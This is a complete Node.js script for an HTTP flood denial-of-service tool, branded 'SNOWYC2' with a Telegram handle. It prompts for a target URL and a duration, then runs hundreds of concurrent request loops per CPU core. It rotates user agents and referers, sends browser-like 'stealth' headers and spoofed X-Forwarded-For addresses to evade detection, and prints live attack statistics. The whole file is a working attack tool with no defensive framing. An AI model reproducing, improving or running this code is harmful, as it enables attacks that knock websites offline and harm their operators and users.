const { request } = require('undici');
const fs = require('fs');
const os = require('os');
const process = require('process');
const http = require('http');
const https = require('https');

const MAX_CONCURRENT = os.cpus().length * 200; // Try up to 1600-3200
const REQUEST_TIMEOUT = 8000;

function loadLines(filename) {
    try {
        return fs.readFileSync(filename, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);
    } catch {
        return [];
    }
}

const REFERERS = loadLines('refs.txt');
const USER_AGENTS = loadLines('ua.txt');

const keepAliveHttp = new http.Agent({ keepAlive: true, maxSockets: Infinity });
const keepAliveHttps = new https.Agent({ keepAlive: true, maxSockets: Infinity });

const stealthHeaders = {
    'sec-ch-ua': '"Chromium";v="120", "Not:A-Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9'
};

class AttackEngine {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = {
            total: 0,
            success: 0,
            errors: 0,
            peakRps: 0
        };
        this.running = true;
    }

    getHeaders() {
        return {
            ...stealthHeaders,
            'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0',
            'Referer': REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com',
            'X-Forwarded-For': Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.')
        };
    }

    async makeRequest() {
        try {
            const res = await request(this.target, {
                method: 'GET',
                headers: this.getHeaders(),
                dispatcher: this.target.startsWith('https') ? keepAliveHttps : keepAliveHttp
            });

            if (res.statusCode === 200) {
                this.stats.success++;
            } else {
                this.stats.errors++;
            }
        } catch {
            this.stats.errors++;
        }
        this.stats.total++;
    }

    async startWorkers() {
        const workers = [];
        for (let i = 0; i < MAX_CONCURRENT; i++) {
            workers.push(this.workerLoop());
        }
        await Promise.all(workers);
    }

    async workerLoop() {
        while (this.running && Date.now() - this.startTime < this.duration) {
            await this.makeRequest();
        }
    }

    async runAttack() {
        const showIntro = () => {
            console.clear();
            console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
            console.log('  ============================================');
            console.log(`  TARGET: ${this.target}`);
            console.log(`  TIME:   ${this.duration / 1000}s`);
            console.log(`  MODE:   GHOST RUSH - ${MAX_CONCURRENT} Concurrency`);
            console.log('  ============================================\n');
        };

        showIntro();

        let lastTotal = 0;
        const printStats = setInterval(() => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const currentRps = (this.stats.total - lastTotal) / 0.2;
            lastTotal = this.stats.total;
            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);

            process.stdout.write(
                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
            );
        }, 200);

        await this.startWorkers();
        this.running = false;
        clearInterval(printStats);
        this.printSummary();
    }

    printSummary() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = this.stats.total / elapsed;
        console.log('\n\n  ATTACK FINISHED');
        console.log('  ============================================');
        console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
        console.log(`  TOTAL:       ${this.stats.total}`);
        console.log(`  SUCCESS:     ${this.stats.success}`);
        console.log(`  ERRORS:      ${this.stats.errors}`);
        console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
        console.log(`  PEAK RPS:    ${this.stats.peakRps.toFixed(1)}`);
        console.log('  ============================================\n');
    }
}

// Main
(async () => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(resolve => readline.question(q, resolve));

    const targetInput = await ask("TARGET: ");
    let target = targetInput.trim();
    if (!target.startsWith("http")) {
        target = "http://" + target;
    }

    const durationInput = await ask("TIME (seconds): ");
    readline.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) {
        console.log("Invalid time input.");
        return;
    }

    const engine = new AttackEngine(target, duration);
    try {
        await engine.runAttack();
    } catch (err) {
        console.error("Attack failed:", err.message);
    }
})();
